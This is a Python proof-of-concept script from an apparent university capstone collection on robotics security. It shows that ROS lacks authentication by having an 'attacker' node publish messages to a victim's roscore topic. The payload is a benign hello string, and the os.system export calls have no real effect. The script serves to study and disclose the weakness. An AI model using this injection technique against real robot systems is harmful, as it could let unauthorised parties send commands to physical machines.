#!/usr/bin/env python
###################################################################################
##                _____________
##               /           ,.\
##              /           /  \\
##        o    /           {    }\
##         `.  \ ....       \  / /
##           `. \ \\\\       `' /
##             \ \_____________/
##              \      \ \
##               \      \ \
##                \     _\ \________________________
##                (`\  /  \ \ ___         "-._       )
##                 \ \/   /`-'  /,       /`-._"-._  /
##                  `/    """"""'       /___ _"-._"-._
##                  /___ __  _          `-._      '  /
##                  \  RoboSec              "-._ /  /
##                 __\________________________  "  /
##               /    '//,  '//'               )__/
##              /       '///'    ,//'/,       /
##             (.---------------------------./
##              `:.                        //
##                `=======================''
##                  Security for Robotics
##
##             Oregon State University - CS Capstone
##
##         Zach Rogers - Malicious ROS Package Collection
##
##             ROS Package 1 - Broken Authentication (Victim Subscriber, Attacker Publisher)
##                         ros1.py
###################################################################################
import os
import rospy
from std_msgs.msg import String

#ROS Environment Variables -- Will need to change these accordingly
ROS_CORE_PORT = "1337"
VICTIM_ROS_HOSTNAME = "192.168.0.10"
VICTIM_ROS_MASTER_URI = "http://" + VICTIM_ROS_HOSTNAME + ":" + ROS_CORE_PORT

ATTACKER_ROS_MASTER_URI = VICTIM_ROS_MASTER_URI
ATTACKER_ROS_HOSTNAME = "192.168.0.11"

#IS THIS SCRIPT RUNNING ON THE ATTACKER OR VICTIM MACHINE?
#When set to VICTIM, the PoC will establish the victim subscriber
#When set to ATTACKER, the PoC will setup the attacker publisher
#Use sys args instead?
WHOAMI = "VICTIM"

#Should we be loud and proud?
VERBOSE = True

def victim_callback(data):
    """
    ROS Subscriber Callback

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29
    """

    rospy.loginfo(rospy.get_caller_id() + 'I heard %s', data.data)

def victim():
    """
    ROS Subscriber, to be ran on the victim's machine

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29
    """

    #Set env variables
    log("[!] We are the victim, setting ROS env variables...")
    os.system("export ROS_MASTER_URI=" + VICTIM_ROS_MASTER_URI)
    os.system("export ROS_HOSTNAME=" + VICTIM_ROS_HOSTNAME)

    ##################
    ## Starting roscore is not needed for this PoC, we are assuming it has already been ran "roscore -p 1337"
    #Kill *all* ROS processes if it is already running -- not sure if this will work with rosrun?
    #This is a dirty, dirty way of accomplishing this
    #os.system("pkill -f ros*")

    #Get ROS core running on the proper port
    #os.system("roscore -p " + ROS_CORE_PORT)
    ##################

    #Get the Subscriber (or listener) setup
    rospy.init_node('listener', anonymous=True)
    rospy.Subscriber('poc_auth', String, victim_callback)

    #Keep python from exiting until this node is stopped
    rospy.spin()

def attacker():
    """
    ROS Publisher, to be ran on the attacker's machine

    http://wiki.ros.org/ROS/Tutorials/WritingPublisherSubscriber%28python%29

    """

    #Set env variables
    log("[!] We are the attacker, setting ROS env variables...")
    os.system("export ROS_MASTER_URI=" + ATTACKER_ROS_MASTER_URI)
    os.system("export ROS_HOSTNAME=" + ATTACKER_ROS_HOSTNAME)

    #Get ROS core running on the proper port
    #We don't have to run ROS CORE on the attacker machine, since it is using the victim's roscore instance
    #os.system("roscore -p " + ROS_CORE_PORT)

    #Setup the publisher (or talker)
    pub = rospy.Publisher('poc_auth', String, queue_size=10)
    rospy.init_node('talker', anonymous=True)
    rate = rospy.Rate(10) # 10hz

    #Publisher loop
    while not rospy.is_shutdown():
        hello_str = "hello, from the ATTACKER machine %s" % rospy.get_time()
        rospy.loginfo(hello_str)
        pub.publish(hello_str)
        rate.sleep()

def log(text):
    """
    Logging function - Will output text if VERBOSE is set to True, otherwise calls will be ignored.

    Parameters:
    --------------
        * text - String of text to be logged

    """

    if VERBOSE:
        print str(text)


def main():
    log("[~] PoC showing lack of authentication in ROS...")

    if WHOAMI == "VICTIM":
        try:
            victim()
        except rospy.ROSInterruptException:
            pass

    elif WHOAMI == "ATTACKER":
        attacker()

if __name__ == '__main__':
    main()
